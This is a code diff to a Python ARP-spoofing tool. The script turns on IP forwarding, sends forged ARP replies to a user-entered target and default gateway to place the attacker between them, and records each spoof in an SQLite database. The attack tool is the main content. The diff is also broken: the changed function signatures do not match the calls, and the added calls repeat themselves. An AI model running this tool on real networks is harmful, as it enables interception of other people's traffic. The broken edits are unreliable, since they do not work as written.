@@ -7,8 +7,6 @@ import sqlite3
 
 conn = sqlite3.connect("Exploitation.db")
 cur = conn.cursor()
-x = False
-y = False
 
 def _enable_linux_iproute():
     file_path = "/proc/sys/net/ipv4/ip_forward"
@@ -23,7 +21,7 @@ _enable_linux_iproute()
 
 
 
-def spoof(target_ip, host_ip, verbose=True):
+def spoof(y, target_ip, host_ip, verbose=True):
     # get the mac address of the target
     target_mac = get_mac(target_ip)
     # craft the arp 'is-at' operation packet, in other words; an ARP response
@@ -42,10 +40,10 @@ def spoof(target_ip, host_ip, verbose=True):
             cur.execute('''INSERT INTO ARP_Spoofing (id, Target_IP, Default_Gateway, Verbose, Target_Mac_Addr,
                         Interface_Mac_Addr) VALUES (NULL, ?, ?, ?, ?, ?)''', alist)
             conn.commit()
-            y = True
+            return y == True
         
         
-def restore(target_ip, host_ip, verbose=True):
+def restore(x, target_ip, host_ip, verbose=True):
     """
     Restores the normal process of a regular network
     This is done by sending the original informations 
@@ -69,7 +67,7 @@ def restore(target_ip, host_ip, verbose=True):
                         Interface_Mac_Addr) VALUES (NULL, ?, ?, ?, ?, ?)
                 ''', alist)
             conn.commit()
-            x = True
+            return x == True
         
        
 target = input("Enter target IP address: ")
@@ -78,10 +76,14 @@ host = input("Enter default gateway IP address: ")
 verbose = True
 try:
         while True:
+            x = False
+            y = False       
             # telling the `target` that we are the `host`
-            spoof(target, host, verbose)
+            x = spoof(target, host, verbose, x)
+            spoof(target, host, verbose, x)
             # telling the `host` that we are the `target`
-            spoof(host, target, verbose)
+            y = spoof(target, host, verbose, y)
+            spoof(host, target, verbose, y)
             # sleep for one second
             time.sleep(1)
 except KeyboardInterrupt:
